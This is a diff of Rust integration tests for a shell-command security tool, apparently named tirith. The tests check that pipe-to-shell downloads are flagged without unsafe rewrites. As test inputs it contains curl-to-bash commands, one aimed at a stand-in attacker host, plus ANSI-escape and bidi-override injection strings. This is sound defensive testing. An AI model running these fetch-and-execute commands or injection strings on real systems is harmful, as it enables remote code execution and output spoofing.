+        let stdout = String::from_utf8_lossy(&output.stdout);
+        for needle in *expected {
+            assert!(
+                stdout.contains(needle),
+                "help for {args:?} omitted {needle:?}:\n{stdout}"
+            );
+        }
+    }
 }
 
 #[test]
@@ -8079,7 +9708,7 @@ fn explain_fix_without_rule_or_finding_is_rejected() {
 }
 
 // tirith fix (M6 ch4). `tirith fix` is a thin presenter over
-// `safe_command::suggest_verified_with_policy()`.
+// `safe_command::suggest_verified_for_cli_inline_with_policy_and_session()`.
 
 #[test]
 fn fix_clean_command_exits_zero_with_no_findings_envelope() {
@@ -8113,7 +9742,95 @@ fn fix_clean_command_human_prints_no_fix_needed() {
 }
 
 #[test]
-fn fix_non_interactive_json_emits_array_for_pipe_to_shell() {
+fn fix_separate_posix_argv_preserves_literal_operator_bytes_as_data() {
+    let out = tirith()
+        .args([
+            "fix",
+            "--json",
+            "--non-interactive",
+            "--",
+            "curl",
+            "-fsSL",
+            "https://example.com/x|bash",
+        ])
+        .output()
+        .expect("failed to run tirith");
+    assert_eq!(
+        out.status.code(),
+        Some(0),
+        "{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let value: serde_json::Value =
+        serde_json::from_slice(&out.stdout).expect("literal-pipe fix output is JSON");
+    assert_eq!(value["reason"], "no_findings", "{value}");
+    assert_eq!(value["command"], "curl -fsSL 'https://example.com/x|bash'");
+    assert!(
+        !String::from_utf8_lossy(&out.stdout).contains("--script-stdin"),
+        "literal argv pipe invented an executable pipeline"
+    );
+}
+
+#[test]
+fn fix_non_posix_multi_argv_refuses_before_analysis_or_safe_output() {
+    for shell in ["fish", "powershell", "cmd"] {
+        let out = tirith()
+            .args([
+                "fix",
+                "--shell",
+                shell,
+                "--json",
+                "--non-interactive",
+                "--",
+                "curl",
+                "https://example.com/x|bash",
+            ])
+            .output()
+            .expect("failed to run tirith");
+        assert_eq!(out.status.code(), Some(2), "shell={shell}");
+        let value: serde_json::Value = serde_json::from_slice(&out.stdout)
+            .unwrap_or_else(|error| panic!("shell={shell}: invalid JSON: {error}"));
+        assert_eq!(value["applied"], false, "shell={shell}");
+        assert_eq!(value["reason"], "ambiguous_command_argv", "shell={shell}");
+        assert!(value.get("safe_command").is_none(), "shell={shell}");
+        assert!(
+            String::from_utf8_lossy(&out.stderr).contains("one quoted command string"),
+            "shell={shell}: {}",
+            String::from_utf8_lossy(&out.stderr)
+        );
+    }
+}
+
+#[test]
+fn check_non_posix_multi_argv_refuses_before_suggestion_output() {
+    for shell in ["fish", "powershell", "cmd"] {
+        let out = tirith()
+            .args([
+                "check",
+                "--shell",
+                shell,
+                "--format",
+                "json",
+                "--suggest-safe-command",
+                "--",
+                "curl",
+                "https://example.com/x|bash",
+            ])
+            .output()
+            .expect("failed to run tirith");
+        assert_eq!(out.status.code(), Some(2), "shell={shell}");
+        let value: serde_json::Value = serde_json::from_slice(&out.stdout)
+            .unwrap_or_else(|error| panic!("shell={shell}: invalid JSON: {error}"));
+        assert!(value.get("error").is_some(), "shell={shell}: {value}");
+        assert!(
+            !String::from_utf8_lossy(&out.stdout).contains("safe_command"),
+            "shell={shell}: executable suggestion leaked"
+        );
+    }
+}
+
+#[test]
+fn fix_non_interactive_json_keeps_pipe_to_shell_guidance_only_for_test_binary() {
     // Acceptance: `tirith fix --json --non-interactive -- "curl … | bash"` emits a valid JSON
     // array of SafeSuggestion.
     let out = tirith()
@@ -8122,34 +9839,28 @@ fn fix_non_interactive_json_emits_array_for_pipe_to_shell() {
             "--json",
             "--non-interactive",
             "--",
-            "curl https://example.com/install.sh | bash",
+            "curl -fsSL https://example.com/install.sh | bash",
         ])
         .output()
         .expect("failed to run tirith");
-    assert_eq!(out.status.code(), Some(2));
+    assert_eq!(out.status.code(), Some(1));
     let v: serde_json::Value =
         serde_json::from_slice(&out.stdout).expect("fix --json --non-interactive valid JSON");
     let arr = v
         .as_array()
         .expect("findings-present shape is a JSON array");
     assert!(!arr.is_empty(), "expected at least one suggestion");
-    // The pipe-to-shell rewrite must be present with the canonical
-    // /tmp/tirith-review.sh download-then-run shape.
+    // The Cargo test binary is user-owned and replaceable after this process
+    // exits. The finding stays useful, but no executable delayed-reinvocation
+    // field may cross stdout/JSON.
     let curl_pipe = arr
         .iter()
         .find(|s| s["rule_id"] == "curl_pipe_shell")
         .expect("curl_pipe_shell suggestion present");
-    let sc = curl_pipe["safe_command"]
+    assert!(curl_pipe.get("safe_command").is_none(), "{curl_pipe}");
+    assert!(curl_pipe["rationale"]
         .as_str()
-        .expect("safe_command is a string for this transform");
-    assert!(
-        sc.contains("/tmp/tirith-review.sh"),
-        "rewrite must use the canonical review scratch path, got: {sc}"
-    );
-    assert!(
-        sc.contains("less /tmp/tirith-review.sh"),
-        "rewrite must include the review step, got: {sc}"
-    );
+        .is_some_and(|rationale| rationale.contains("No safe executable rewrite")));
     // Every suggestion must carry a non-empty `remediation` (honest guidance)
     // — this is the discipline that prevents fabricated rewrites.
     for s in arr {
@@ -8165,21 +9876,21 @@ fn fix_non_interactive_json_emits_array_for_pipe_to_shell() {
 }
 
 #[test]
-fn fix_composes_multi_finding_rewrites_and_only_emits_an_allow_command() {
-    // Regression for repo-0149: dropping only `-k` would leave both the plain-
-    // HTTP sink and pipe-to-shell findings. The executable field must contain a
-    // composed final command, and that exact string must pass the same checker.
+fn fix_never_exposes_a_partial_multi_finding_rewrite_without_trusted_reinvocation() {
+    // Dropping only `-k` or changing only HTTP would leave the pipe-to-shell
+    // finding. With a replaceable Tirith test binary, the final capsule step is
+    // unavailable, so no partial executable command may be serialized.
     let out = tirith()
         .args([
             "fix",
             "--json",
             "--non-interactive",
             "--",
-            "curl -k http://attacker.invalid/script | bash",
+            "curl -k -fsSL http://attacker.invalid/script | bash",
         ])
         .output()
         .expect("failed to run tirith fix");
-    assert_eq!(out.status.code(), Some(2));
+    assert_eq!(out.status.code(), Some(1));
     let suggestions: serde_json::Value =
         serde_json::from_slice(&out.stdout).expect("fix output is JSON");
     let executable: Vec<&str> = suggestions
@@ -8188,44 +9899,9 @@ fn fix_composes_multi_finding_rewrites_and_only_emits_an_allow_command() {
         .iter()
         .filter_map(|suggestion| suggestion["safe_command"].as_str())
         .collect();
-    assert_eq!(
-        executable.len(),
-        1,
-        "only the composed, verified command may be executable: {suggestions}"
-    );
-    let command = executable[0];
     assert!(
-        !command.contains(" -k"),
-        "TLS bypass must be removed: {command}"
-    );
-    assert!(
-        command.contains("https://attacker.invalid/script"),
-        "plain HTTP must be upgraded in the composed command: {command}"
-    );
-    assert!(
-        command.contains("less /tmp/tirith-review.sh"),
-        "pipe-to-shell must become review-before-run: {command}"
-    );
-
-    let checked = tirith()
-        .args([
-            "check",
-            "--shell",
-            "posix",
-            "--non-interactive",
-            "--no-daemon",
-            "--offline",
-            "--",
-            command,
-        ])
-        .output()
-        .expect("re-analyze emitted command");
-    assert_eq!(
-        checked.status.code(),
-        Some(0),
-        "the exact executable suggestion must re-analyze to Allow; stderr={} stdout={}",
-        String::from_utf8_lossy(&checked.stderr),
-        String::from_utf8_lossy(&checked.stdout)
+        executable.is_empty(),
+        "a partial or replaceable executable suggestion must not escape: {suggestions}"
     );
 }
 
@@ -8267,9 +9943,10 @@ fn fix_keeps_archive_preview_then_extract_partial_rewrite_out_of_json() {
 
 #[test]
 fn fix_reanalysis_preserves_custom_policy_and_cwd_context() {
-    // The raw TLS rewrite is clean under built-in rules, but this repo policy
-    // forbids the target host at Medium severity. Losing cwd/policy during
-    // re-analysis would incorrectly expose it as executable.
+    // This exact pipe shape has a raw typed-runner candidate on supported Linux,
+    // but this repo policy forbids the target host. The core exact-seam test
+    // proves the executable gate against the frozen snapshot; this CLI receipt
+    // proves discovery retains the caller's cwd and surfaces that custom rule.
     let policy = r#"custom_rules:
   - id: forbid-example-fetch
     when:
@@ -8285,13 +9962,21 @@ fn fix_reanalysis_preserves_custom_policy_and_cwd_context() {
             "--json",
             "--non-interactive",
             "--",
-            "curl -k https://example.com/file",
+            "curl -fsSL https://example.com/install.sh | bash",
         ])
         .output()
         .expect("failed to run tirith fix under custom policy");
     assert_eq!(out.status.code(), Some(1));
     let suggestions: serde_json::Value =
         serde_json::from_slice(&out.stdout).expect("fix output is JSON");
+    assert!(
+        suggestions
+            .as_array()
+            .expect("findings-present shape is an array")
+            .iter()
+            .any(|suggestion| suggestion["rule_id"] == "custom_rule_match"),
+        "repo-local custom rule must be present: {suggestions}"
+    );
     assert!(
         suggestions
             .as_array()
@@ -8334,7 +10019,7 @@ fn fix_partial_rewrite_human_guidance_is_terminal_safe() {
 }
 
 #[test]
-fn fix_non_interactive_emits_array_without_json_flag() {
+fn fix_non_interactive_guidance_emits_array_without_json_flag() {
     // Spec step 8: `--non-interactive` → JSON-emit all suggestions; `--json`
     // is its strict superset. Both should produce the same shape.
     let out = tirith()
@@ -8346,7 +10031,7 @@ fn fix_non_interactive_emits_array_without_json_flag() {
         ])
         .output()
         .expect("failed to run tirith");
-    assert_eq!(out.status.code(), Some(2));
+    assert_eq!(out.status.code(), Some(1));
     let v: serde_json::Value =
         serde_json::from_slice(&out.stdout).expect("fix --non-interactive (no --json) valid JSON");
     assert!(
@@ -8356,9 +10041,9 @@ fn fix_non_interactive_emits_array_without_json_flag() {
 }
 
 #[test]
-fn fix_no_tty_with_rewrites_exits_two() {
-    // Spec acceptance: `tirith fix --non-interactive -- "echo nope" </dev/null` exits 2 IF no
-    // suggestion can be applied.
+fn fix_no_tty_with_guidance_only_exits_one() {
+    // This curl shape lacks the status/redirect proof needed for an executable
+    // typed runner, so non-interactive output is guidance and exits 1.
     use std::process::Stdio;
     let out = tirith()
         .args([
@@ -8370,7 +10055,7 @@ fn fix_no_tty_with_rewrites_exits_two() {
         .stdin(Stdio::null())
         .output()
         .expect("failed to run tirith");
-    assert_eq!(out.status.code(), Some(2));
+    assert_eq!(out.status.code(), Some(1));
 }
 
 #[test]
@@ -8387,21 +10072,35 @@ fn fix_with_shell_flag_routes_through_powershell_tokenizer() {
         ])
         .output()
         .expect("failed to run tirith");
-    // We expect findings + at least one suggestion (so exit 2 under --non-interactive).
+    // `bash.exe` is not a supported Unix capsule interpreter. The PowerShell
+    // tokenizer must still surface the finding, but it must not invent an
+    // executable rewrite whose interpreter semantics Tirith cannot preserve.
     assert_eq!(
         out.status.code(),
-        Some(2),
+        Some(1),
         "powershell shell path must reach a finding: stdout={}",
         String::from_utf8_lossy(&out.stdout)
     );
     let v: serde_json::Value =
         serde_json::from_slice(&out.stdout).expect("fix --shell powershell valid JSON");
     assert!(v.is_array(), "findings-present must be array shape");
+    let suggestions = v.as_array().expect("suggestion array");
+    assert!(
+        suggestions
+            .iter()
+            .any(|item| item["rule_id"] == "curl_pipe_shell"),
+        "PowerShell pipeline finding must remain visible: {v}"
+    );
+    assert!(
+        suggestions
+            .iter()
+            .all(|item| item.get("safe_command").is_none()),
+        "unsupported bash.exe semantics must remain guidance-only: {v}"
+    );
 }
 
 #[test]
-fn fix_unknown_shell_falls_back_to_posix_with_warning() {
-    // `tirith check` warns and falls back to posix on an unknown --shell.
+fn fix_unknown_shell_is_rejected_without_fallback() {
     let out = tirith()
         .args([
             "fix",
@@ -8413,11 +10112,35 @@ fn fix_unknown_shell_falls_back_to_posix_with_warning() {
         ])
         .output()
         .expect("failed to run tirith");
-    assert_eq!(out.status.code(), Some(0));
+    assert_eq!(out.status.code(), Some(2));
     let stderr = String::from_utf8_lossy(&out.stderr);
     assert!(
         stderr.contains("unknown shell"),
         "expected stderr warning for unknown shell, got: {stderr}"
+    );
+    let value: serde_json::Value =
+        serde_json::from_slice(&out.stdout).expect("unknown shell response is valid JSON");
+    assert_eq!(value["reason"], "unknown_shell");
+}
+
+#[test]
+fn check_unknown_shell_human_diagnostic_is_terminal_safe() {
+    let hostile_shell = "tcsh\x1b[2J\nFORGED\u{202e}";
+    let out = tirith()
+        .args(["check", "--shell", hostile_shell, "--", "ls"])
+        .output()
+        .expect("failed to run tirith");
+    assert_eq!(out.status.code(), Some(2));
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(stderr.contains("unknown shell 'tcshFORGED'"), "{stderr:?}");
+    assert!(!stderr.contains('\x1b'), "ANSI escape leaked: {stderr:?}");
+    assert!(
+        !stderr.contains('\u{202e}'),
+        "bidi override leaked: {stderr:?}"
+    );
+    assert!(
+        !stderr.contains("\nFORGED"),
+        "forged row leaked: {stderr:?}"
     );
 }
 
@@ -8432,13 +10155,10 @@ fn fix_empty_command_is_no_op_exit_zero() {
     assert_eq!(out.status.code(), Some(0));
 }
 
-// M8 ch4 — deferred sudo-narrow CLI tests. The M6 ch5 sudo-narrow `tirith fix` CLI tests deferred
-// the positive case (no stable benign-target fixture in M6) and an explicit M8 ch4 negative pin.
+// M8 ch4 — sudo-related CLI guidance tests.
 
 #[test]
-fn fix_sudo_apt_update_emits_sudo_narrow_rewrite() {
-    // Positive — `sudo apt update` triggers no engine finding on its own (sudo + a benign apt
-    // verb), so there's no rewrite handle for the suggester to attach to (M8 ch4).
+fn fix_sudo_download_emits_guidance_without_rewrite() {
     let out = tirith()
         .args([
             "fix",
@@ -8450,10 +10170,10 @@ fn fix_sudo_apt_update_emits_sudo_narrow_rewrite() {
         .output()
         .expect("failed to run tirith");
     // Verdict has findings + no mechanical rewrite → exit 1 (guidance only).
-    let exit = out.status.code();
-    assert!(
-        exit == Some(1) || exit == Some(2),
-        "expected exit 1 or 2, got: {exit:?} stdout={}",
+    assert_eq!(
+        out.status.code(),
+        Some(1),
+        "guidance-only sudo download must exit 1; stdout={}",
         String::from_utf8_lossy(&out.stdout)
     );
     let v: serde_json::Value =
@@ -8483,10 +10203,10 @@ fn fix_sudo_sh_emits_no_rewrite_with_interactive_shell_rationale() {
         .output()
         .expect("failed to run tirith");
     // Verdict has findings, no mechanical rewrite possible.
-    let exit = out.status.code();
-    assert!(
-        exit == Some(1) || exit == Some(2),
-        "expected exit 1 or 2, got: {exit:?} stdout={}",
+    assert_eq!(
+        out.status.code(),
+        Some(1),
+        "guidance-only sudo shell finding must exit 1; stdout={}",
         String::from_utf8_lossy(&out.stdout)
     );
     let v: serde_json::Value =
@@ -17048,20 +18768,23 @@ fn audit_verify_clean_chain_then_detects_tamper_and_expected_head() {
 }
 
 #[test]
-fn fix_on_non_tty_prints_rerun_hint() {
-    // Item 14d (pre-existing): the non-interactive `tirith fix` path must surface
-    // the rerun hint so a piped user knows how to capture suggestions.
-    // A plain URL keeps the mechanical rewrite (a shortened one re-analyzes to
-    // a shortened_url finding, which drops this into the guidance-only branch
-    // that has no rerun hint to print).
+fn fix_on_non_tty_guidance_exits_one_without_rerun_hint() {
+    // This shape has guidance but no verified executable rewrite. Non-TTY mode
+    // must report that distinction directly instead of implying a rewrite can be
+    // captured on a second invocation.
     let out = tirith()
         .args(["fix", "curl https://example.com/install.sh | bash"])
         .output()
         .expect("run fix");
     let err = String::from_utf8_lossy(&out.stderr);
+    assert_eq!(out.status.code(), Some(1), "stderr: {err}");
     assert!(
-        err.contains("--non-interactive") && err.contains("--json"),
-        "fix on a non-TTY prints the rerun hint; stderr: {err}"
+        err.contains("no mechanical rewrite available"),
+        "guidance-only fix must explain why nothing is applyable; stderr: {err}"
+    );
+    assert!(
+        !err.contains("--non-interactive") && !err.contains("--json"),
+        "guidance-only fix must not advertise a nonexistent rewrite; stderr: {err}"
     );
 }
 
@@ -18064,6 +19787,63 @@ fn assert_attack_codepoints_stripped(human: &[u8]) {
     assert!(
         s.contains("ENDvis"),
         "trailing visible anchor must survive the scrub; got: {s:?}"
+    );
+}
+
+#[test]
+fn install_human_output_neutralizes_hostile_command_and_package_name() {
+    let out = tirith_install()
+        .args(["install", "--no-exec", "npm", ATTACK_PAYLOAD])
+        .output()
+        .expect("failed to run tirith install with hostile package text");
+
+    assert_attack_codepoints_stripped(&out.stderr);
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        !stderr.lines().any(|line| line.starts_with("ENDvis")),
+        "an install argument newline must not forge a terminal row: {stderr:?}"
+    );
+    assert!(
+        stderr.contains("analysis only") && stderr.contains("NOT run"),
+        "the no-exec outcome should remain readable: {stderr:?}"
+    );
+}
+
+#[test]
+fn install_machine_json_preserves_raw_structured_command_text() {
+    let out = tirith_install()
+        .args([
+            "install",
+            "--no-exec",
+            "--format",
+            "json",
+            "npm",
+            ATTACK_PAYLOAD,
+        ])
+        .output()
+        .expect("failed to run JSON install analysis with hostile package text");
+    let parsed: serde_json::Value =
+        serde_json::from_slice(&out.stdout).expect("install machine output must remain valid JSON");
+    assert_eq!(parsed["analysis"]["argv"]["program"], "npm");
+    assert_eq!(
+        parsed["analysis"]["argv"]["args"],
+        serde_json::json!(["install", ATTACK_PAYLOAD]),
+        "structured JSON argv must preserve exact argument identity"
+    );
+    let command = parsed["analysis"]["command"]
+        .as_str()
+        .expect("analysis command must be a JSON string");
+    assert!(
+        command.contains('\x1b'),
+        "raw ESC must survive in JSON data"
+    );
+    assert!(
+        command.contains('\u{202e}'),
+        "raw bidi codepoint must survive in JSON data"
+    );
+    assert!(
+        command.contains('\n'),
+        "raw argument newline must survive in JSON data"
     );
 }
 
